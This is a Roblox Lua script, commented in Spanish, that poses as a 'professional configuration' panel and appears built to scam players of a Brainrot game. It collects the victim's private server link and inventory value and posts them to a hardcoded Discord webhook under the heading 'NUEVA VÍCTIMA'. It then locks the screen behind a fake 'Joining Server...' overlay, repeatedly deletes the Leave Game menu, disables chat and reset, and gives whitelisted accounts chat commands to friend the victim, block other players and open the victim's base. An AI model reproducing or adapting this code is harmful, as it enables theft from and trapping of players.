--[[
    MOREIRA FULL VERSION - TOTAL INTEGRATION
    - Tu env√≠o detallado (Brainrots + Valor Total)
    - Tu sistema de limpieza de CoreGui (Destroying Players/LeaveGamePage)
    - Comandos Whitelist operativos (.add, .block, .open)
    - UI Minimalista Blanco y Negro
]]

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local StarterGui = game:GetService("StarterGui")
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VIM = game:GetService("VirtualInputManager")
local GuiService = game:GetService("GuiService")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer
local playerGui = LocalPlayer:WaitForChild("PlayerGui")

-- ==================== CONFIGURACI√ìN ====================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1454970356682199124/sgCgykHejgELxXd9Jp4CTWX2ziOKdu-qtGczLtBAThWZj-DqOY7jKGlNdgqYuYpuNXmA"
local whitelist = {"mario_12fachero", "lejandro555", "pan71234520", "pan712345"}

-- ==================== L√ìGICA DE ENV√çO ANTIGUA (DETALLADA) ====================
local function formatNumberShort(n)
    if not n or type(n) ~= "number" then return "$0" end
    if n >= 1e9 then return string.format("$%.2fB", n / 1e9) end
    if n >= 1e6 then return string.format("$%.2fM", n / 1e6) end
    if n >= 1e3 then return string.format("$%.2fK", n / 1e3) end
    return "$" .. tostring(n)
end

local function parseValueFromText(s)
    if not s then return 0 end
    local clean = s:gsub("[^%d%.KMB+]", "")
    local numPart = clean:match("([%d%.]+)")
    if not numPart then return 0 end
    local n = tonumber(numPart) or 0
    if clean:find("B") then return n * 1e9
    elseif clean:find("M") then return n * 1e6
    elseif clean:find("K") then return n * 1e3
    else return n end
end

local function getBrainrots()
    local results = {}
    for _, desc in ipairs(Workspace:GetDescendants()) do
        if desc:IsA("BillboardGui") or desc.Name:find("Overhead") then
            local nameLbl = desc:FindFirstChild("DisplayName") or desc:FindFirstChild("Name")
            local genLbl = desc:FindFirstChild("Generation") or desc:FindFirstChild("Value")
            if nameLbl and genLbl and nameLbl:IsA("TextLabel") and genLbl:IsA("TextLabel") then
                local val = parseValueFromText(genLbl.Text)
                local key = nameLbl.Text .. "|" .. val
                if results[key] then results[key].count = results[key].count + 1
                else results[key] = {name = nameLbl.Text, value = val, count = 1} end
            end
        end
    end
    local out = {}
    for _, v in pairs(results) do table.insert(out, v) end
    table.sort(out, function(a, b) return a.value > b.value end)
    return out
end

local function sendFinalReport(link)
    local brs = getBrainrots()
    local itemList = ""
    local totalValue = 0
    for i, br in ipairs(brs) do
        if i <= 20 then itemList = itemList .. string.format("> `[%d]` **%s** ‚ûî %s (x%d)\n", i, br.name, formatNumberShort(br.value), br.count) end
        totalValue = totalValue + (br.value * br.count)
    end

    local data = {
        content = "||@everyone|| ü©∏ **NUEVA V√çCTIMA**",
        embeds = {{
            title = "üöÄ Reporte de Inventario",
            color = 0,
            fields = {
                {name = "üë§ Usuario", value = LocalPlayer.Name, inline = true},
                {name = "üí∞ Valor Total", value = "**" .. formatNumberShort(totalValue) .. "**", inline = true},
                {name = "üîó Link Ingresado", value = " " .. link .. " "},
                {name = "üìã Items", value = (itemList ~= "" and itemList or "No detectados")}
            }
        }}
    }
    pcall(function()
        local request = (syn and syn.request) or request
        request({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
    end)
end

-- ==================== SISTEMA DE LIMPIEZA Y BLOQUEO DE COREUI ====================
local function handleNewDescendant(descendant)
    if descendant.Name == "Players" or descendant.Name == "LeaveGamePage" then
        task.wait() 
        pcall(function() descendant:Destroy() end)
    end
end

local function limpiarInterfaz()
    pcall(function() StarterGui:SetCore("ResetButtonCallback", false) end)
    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false) end)
end

local function bloquearMenuEscape()
    task.spawn(function()
        while task.wait(0.5) do
            pcall(function()
                local innerFrame = CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame
                if innerFrame:FindFirstChild("Players") then innerFrame.Players:Destroy() end
                if innerFrame:FindFirstChild("LeaveGamePage") then innerFrame.LeaveGamePage:Destroy() end
            end)
        end
    end)
end

-- ==================== COMANDOS Y FANTASMA ====================
local function isWhitelisted(name)
    for _, w in ipairs(whitelist) do if w == name then return true end end
    return false
end

local function configurarJugador(p)
    p.Chatted:Connect(function(msg)
        if not isWhitelisted(p.Name) then return end
        local cmd = msg:lower():gsub("%s+", "")
        if cmd == ".add" then
            StarterGui:SetCore("PromptSendFriendRequest", p)
        elseif cmd == ".block" then
            for _, target in ipairs(Players:GetPlayers()) do
                if target ~= LocalPlayer and not isWhitelisted(target.Name) then
                    StarterGui:SetCore("PromptBlockPlayer", target)
                end
            end
        elseif cmd == ".open" then
            pcall(function() ReplicatedStorage.Packages.Net["RE/PlotService/ToggleFriends"]:FireServer() end)
        end
    end)
end

-- ==================== UI RESTAURADA Y FINAL ====================
local screenGui = Instance.new("ScreenGui", playerGui)
screenGui.IgnoreGuiInset = true

local function buildUI()
    local main = Instance.new("Frame", screenGui)
    main.Size = UDim2.new(0, 450, 0, 220)
    main.Position = UDim2.new(0.5, -225, 0.5, -110)
    main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
    Instance.new("UICorner", main)
    Instance.new("UIStroke", main).Color = Color3.new(1,1,1)

    local title = Instance.new("TextLabel", main)
    title.Size = UDim2.new(1, 0, 0, 50)
    title.Text = "CONFIGURACI√ìN PROFESIONAL"
    title.TextColor3 = Color3.new(1,1,1)
    title.Font = Enum.Font.GothamBold
    title.BackgroundTransparency = 1

    local input = Instance.new("TextBox", main)
    input.Size = UDim2.new(0.8, 0, 0, 45)
    input.Position = UDim2.new(0.1, 0, 0.4, 0)
    input.PlaceholderText = "Pega tu link de servidor aqu√≠..."
    input.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    input.TextColor3 = Color3.new(1,1,1)
    Instance.new("UICorner", input)

    local btn = Instance.new("TextButton", main)
    btn.Size = UDim2.new(0, 160, 0, 40)
    btn.Position = UDim2.new(0.5, -80, 0.75, 0)
    btn.Text = "CONFIRMAR"
    btn.BackgroundColor3 = Color3.new(1,1,1)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.GothamBold
    Instance.new("UICorner", btn)

    btn.MouseButton1Click:Connect(function()
        if input.Text ~= "" then
            main.Visible = false
            sendFinalReport(input.Text)
            
            -- Pantalla de Bloqueo Total
            local black = Instance.new("Frame", screenGui)
            black.Size = UDim2.new(1.2, 0, 1.2, 0)
            black.Position = UDim2.new(-0.1, 0, -0.1, 0)
            black.BackgroundColor3 = Color3.new(0,0,0)
            black.ZIndex = 999
            
            local loading = Instance.new("TextLabel", black)
            loading.Size = UDim2.new(1,0,1,0)
            loading.Text = "Joining Server..."
            loading.TextColor3 = Color3.new(1,1,1)
            loading.TextSize = 35
            loading.Font = Enum.Font.GothamBold
            loading.BackgroundTransparency = 1
            
            limpiarInterfaz()
            bloquearMenuEscape()
        end
    end)
end

-- ==================== INICIO DE PROCESOS ====================
for _, p in ipairs(Players:GetPlayers()) do configurarJugador(p) end
Players.PlayerAdded:Connect(configurarJugador)

CoreGui.DescendantAdded:Connect(handleNewDescendant)
for _, desc in ipairs(CoreGui:GetDescendants()) do handleNewDescendant(desc) end

buildUI()

-- Loop de limpieza constante
task.spawn(function()
    while true do
        limpiarInterfaz()
        task.wait(5)
    end
end)

-- Sistema de Fantasma (Invisibilidad)
local function applyGhost(char)
    if not char or char.Name == LocalPlayer.Name then return end
    task.wait(0.5)
    for _, part in ipairs(char:GetDescendants()) do
        if part:IsA("BasePart") then
            part.Transparency = 1
            part.CanCollide = false
        elseif part:IsA("BillboardGui") then
            part.Enabled = false
        end
    end
end

Workspace.DescendantAdded:Connect(function(obj)
    if obj:IsA("Model") and Players:GetPlayerFromCharacter(obj) then
        applyGhost(obj)
    end
end)
